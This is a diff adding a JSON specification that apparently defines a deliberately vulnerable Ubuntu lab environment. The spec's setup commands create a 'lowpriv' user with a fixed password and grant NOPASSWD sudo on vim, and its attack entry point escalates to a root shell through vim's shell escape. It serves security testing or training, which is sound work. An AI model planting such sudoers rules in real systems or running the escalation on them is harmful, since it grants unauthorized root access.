@@ -1,0 +1,15 @@
+{
+  "summary": "Permissive sudo NOPASSWD misconfiguration allows a low-privilege user to run an unrestricted binary as root and escalate to a root shell",
+  "runtime": "ubuntu",
+  "app_description": "",
+  "endpoints": [],
+  "vulnerability_placement": "A low-privilege user (e.g., 'lowpriv') is created on the system. A sudoers rule is added via /etc/sudoers.d/lowpriv granting that user NOPASSWD access to run /usr/bin/vim as root with no restrictions (no NOEXEC, no command argument restrictions). Because vim allows shell escapes via ':!/bin/bash' or ':shell', the user can trivially spawn a root shell. Alternatively, the rule may grant unrestricted sudo access to /usr/bin/find or /usr/bin/python3, each of which can be used to execute arbitrary commands as root. The setup script: (1) creates the 'lowpriv' user with password 'lowpriv123', (2) writes 'lowpriv ALL=(ALL) NOPASSWD: /usr/bin/vim' to /etc/sudoers.d/lowpriv, (3) sets correct permissions (0440) on that file, (4) ensures vim is installed.",
+  "data_model": {
+    "tables": []
+  },
+  "attack_entry_point": "sudo vim -c ':!/bin/bash' /dev/null\n# OR equivalently:\nsudo vim -c ':shell' /dev/null\n# Once inside vim, type: :!/bin/bash\n# This spawns a root shell. Verify with: id",
+  "success_indicator": "uid=0(root) gid=0(root) groups=0(root)",
+  "extra_npm_packages": [],
+  "extra_pip_packages": [],
+  "notes": "Setup bash script should: apt-get install -y vim; useradd -m -s /bin/bash lowpriv; echo 'lowpriv:lowpriv123' | chpasswd; echo 'lowpriv ALL=(ALL) NOPASSWD: /usr/bin/vim' > /etc/sudoers.d/lowpriv; chmod 0440 /etc/sudoers.d/lowpriv. The low-privilege user credentials (lowpriv / lowpriv123) must match whatever is provided by the ssh_shell_lowpriv edge. The GTFOBins technique for vim is: sudo vim -c ':!/bin/bash' which immediately drops into a root bash shell without requiring any interactive input."
+}
